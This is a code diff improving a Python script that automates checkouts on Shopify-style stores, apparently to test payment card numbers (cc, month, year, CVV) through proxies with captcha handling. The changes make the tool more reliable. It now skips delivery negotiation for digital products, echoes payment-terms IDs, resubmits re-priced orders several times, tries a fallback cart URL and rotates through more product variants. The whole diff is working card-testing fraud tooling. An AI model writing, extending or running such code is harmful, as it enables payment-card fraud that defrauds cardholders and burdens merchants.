@@ -212,11 +212,6 @@ async def fetch_products(domain, proxy_str=None):
             for variant in product['variants']:
                 if not variant.get('available', True):
                     continue
-                # digital/gift-card variants (no shipping) collapse the checkout delivery
-                # line -> DELIVERY_DELIVERY_LINE_DETAIL_CHANGED; skip them
-                if variant.get('requires_shipping') is False:
-                    continue
-
                 try:
                     price = variant.get('price', '0')
                     if isinstance(price, str):
@@ -242,7 +237,7 @@ async def fetch_products(domain, proxy_str=None):
         
         if isinstance(min_product, dict) and min_product.get('variant_id'):
             others = sorted(candidates, key=lambda x: x[0])
-            min_product['candidates'] = [vid for pr, vid in others if vid != min_product['variant_id']][:4]
+            min_product['candidates'] = [{"id": vid, "price": pr} for pr, vid in others if vid != min_product['variant_id']][:6]
             return min_product
         else:
             return False, "<b>No Valid Products</b>"
@@ -295,7 +290,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     payment_identifier = None
     proxy = parse_proxy(proxy_str) if proxy_str else None
     checkpoint_data = None
+    flex_terms_id = None
     running_total = "0.00"
+    requires_shipping = True
+
 
     try:
         headers = {
@@ -371,13 +369,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             text = ""
             checkout_url = ""
             attempt_token = ""
-            for create_method in ("POST", "GET"):
+            for create_method, create_url in (("POST", checkout), ("GET", checkout), ("GET", f"{url}/cart/{variant_id}:1")):
                 try:
                     if create_method == "POST":
-                        response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+                        response = await session.post(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                     else:
                         await asyncio.sleep(1.5)
-                        response = await session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+                        response = await session.get(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                 except Exception:
                     continue
                 checkout_url = str(response.url)
@@ -623,6 +621,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                 
                 running_total = running_total_data['value']['amount']
+                _ftm = re.search(r'"paymentFlexibilityPaymentTermsTemplate":\{"id":"([^"]+)"', resp_text)
+                flex_terms_id = _ftm.group(1) if _ftm else None
                 if float(running_total) <= 0:
                     return False, "PAYMENTS_POSITIVE_AMOUNT_EXPECTED", gateway, total_price, currency
 
@@ -631,6 +631,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 # merchandise proposal and payment in sync with it
                 _bp = result.get('buyerProposal') or {}
                 _ml0 = ((_bp.get('merchandise') or {}).get('merchandiseLines') or [{}])[0]
+                _dm = _ml0.get('merchandise') or {}
+                if _dm.get('requiresShipping') is False:
+                    requires_shipping = False
                 _ma = ((_ml0.get('totalAmount') or {}).get('value') or {}).get('amount')
                 if _ma and float(_ma) > 0:
                     subtotal = str(_ma)
@@ -721,12 +724,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
-            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-            )
-            
-            if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
+            if requires_shipping:
+                # digital products: no delivery proposal — negotiating delivery on a
+                # non-shipping cart mutates the session total and churns the submit
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                )
+
+                if is_captcha_required(resp_text):
+                    return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
 
             payload = {
                 "credit_card": {
@@ -892,7 +898,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if checkpoint_data:
                 submit_variables['input']['checkpointData'] = checkpoint_data
-            
+
+            # stores with payment-terms templates: the submit must echo the session's
+            # selected flexibility terms id or the payment is rejected
+            if flex_terms_id:
+                submit_variables['input']['payment']['paymentFlexibilityTermsId'] = flex_terms_id
+
+            # digital products (requiresShipping=false): no delivery section — the
+            # delivery line collapsing is what caused DELIVERY_DELIVERY_LINE_DETAIL_CHANGED
+            if not requires_shipping:
+                submit_variables['input'].pop('delivery', None)
+
             submit_json_data = {
                 'query': MUTATION_SUBMIT,
                 'variables': submit_variables,
@@ -906,19 +922,24 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if is_captcha_required(text):
                 return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
             
-            if "Your order total has changed." in text:
-                # session re-priced between proposal and submit; the rejection carries the
-                # updated totals — resubmit once with the corrected amount
+            _resubs = 0
+            while "Your order total has changed." in text and _resubs < 3:
+                # the rejection carries the session's updated totals — resubmit with the
+                # corrected amount (converging re-pricing apps settle within 1-2 rounds)
+                _resubs += 1
                 _ckm = re.search(r'"checkoutTotal":\{"value":\{"amount":"([0-9.]+)"', text)
-                if _ckm:
-                    submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = _ckm.group(1)
-                    response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
-                    )
-                    if "Your order total has changed." in text:
-                        return False, "Site not supported", gateway, total_price, currency
-                else:
-                    return False, "Site not supported", gateway, total_price, currency
+                if not _ckm:
+                    break
+                submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = _ckm.group(1)
+                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                )
+            if "Your order total has changed." in text:
+                if not requires_shipping:
+                    # digital product: the store's app keeps re-pricing it — marker lets
+                    # the caller rotate to the next variant
+                    return False, "DIGITAL_PRODUCT_CHURN", gateway, total_price, currency
+                return False, "Site not supported", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
